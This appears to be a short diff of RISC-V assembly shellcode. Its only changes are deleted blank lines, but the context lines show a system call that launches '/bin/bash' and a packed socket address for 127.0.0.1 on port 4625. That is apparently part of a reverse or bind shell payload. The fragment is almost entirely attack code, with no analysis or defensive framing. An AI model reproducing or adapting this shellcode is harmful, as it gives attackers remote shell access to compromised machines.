@@ -47,7 +47,6 @@ _start:
 	la a0, shell
 	move a1, zero
 	ecall
-	
 
 exit:	
 	# Exit
@@ -58,5 +57,3 @@ exit:
 
 shell:  .asciz "/bin/bash"
 addr:	.quad 0x0100007f11120002
-
-
